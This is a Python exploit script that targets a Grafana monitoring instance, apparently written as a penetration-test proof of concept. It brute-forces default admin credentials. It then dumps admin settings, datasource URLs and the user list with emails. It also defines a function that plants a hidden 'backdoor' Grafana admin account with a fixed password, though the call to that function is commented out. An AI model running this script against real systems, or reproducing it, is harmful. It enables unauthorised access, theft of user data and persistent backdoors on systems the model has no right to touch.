#!/usr/bin/env python3
"""
Exploit: Default Grafana Credentials
Target: CC-Monitoring Grafana Instance
Impact: Admin access to monitoring dashboard
"""

import requests
import base64
import json
import sys

def check_default_creds(target_url):
    """Test for default Grafana credentials"""
    print(f"[*] Testing default credentials on {target_url}")
    
    # Default credentials from .env file
    default_creds = [
        ("admin", "changeme"),
        ("admin", "admin"),
        ("admin", "password")
    ]
    
    for username, password in default_creds:
        print(f"[*] Trying {username}:{password}")
        
        # Create basic auth header
        creds = base64.b64encode(f"{username}:{password}".encode()).decode()
        headers = {"Authorization": f"Basic {creds}"}
        
        try:
            # Test authentication
            r = requests.get(f"{target_url}/api/org", headers=headers, timeout=5)
            
            if r.status_code == 200:
                print(f"[+] SUCCESS! Authenticated with {username}:{password}")
                print(f"[+] Organization: {r.json()}")
                
                # Get admin settings
                admin_r = requests.get(f"{target_url}/api/admin/settings", headers=headers)
                if admin_r.status_code == 200:
                    print("[+] Admin access confirmed!")
                    
                # List datasources (may contain credentials)
                ds_r = requests.get(f"{target_url}/api/datasources", headers=headers)
                if ds_r.status_code == 200:
                    print(f"[+] Found {len(ds_r.json())} datasources")
                    for ds in ds_r.json():
                        print(f"    - {ds['name']}: {ds['type']} @ {ds.get('url', 'N/A')}")
                
                # Get users
                users_r = requests.get(f"{target_url}/api/users", headers=headers)
                if users_r.status_code == 200:
                    print(f"[+] Found {len(users_r.json())} users")
                    for user in users_r.json():
                        print(f"    - {user['login']} ({user['email']})")
                
                return True
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Error: {e}")
            continue
    
    print("[-] No default credentials worked")
    return False

def create_backdoor_user(target_url, auth_header):
    """Create a backdoor admin user"""
    print("[*] Attempting to create backdoor user...")
    
    payload = {
        "name": "support",
        "email": "support@localhost",
        "login": "support",
        "password": "backdoor123!"
    }
    
    r = requests.post(
        f"{target_url}/api/admin/users",
        headers=auth_header,
        json=payload
    )
    
    if r.status_code == 200:
        print("[+] Backdoor user created successfully!")
        user_id = r.json()['id']
        
        # Make the user an admin
        perm_r = requests.put(
            f"{target_url}/api/admin/users/{user_id}/permissions",
            headers=auth_header,
            json={"isGrafanaAdmin": True}
        )
        
        if perm_r.status_code == 200:
            print("[+] Backdoor user promoted to admin!")
            print("[+] Login: support / backdoor123!")
    else:
        print(f"[-] Failed to create backdoor: {r.text}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
    
    print("="*50)
    print("Grafana Default Credentials Exploit")
    print("="*50)
    
    if check_default_creds(target):
        print("\n[!] Grafana is using default credentials!")
        print("[!] This is a critical security vulnerability")
        
        # Optional: create backdoor
        # creds = base64.b64encode(b"admin:changeme").decode()
        # create_backdoor_user(target, {"Authorization": f"Basic {creds}"})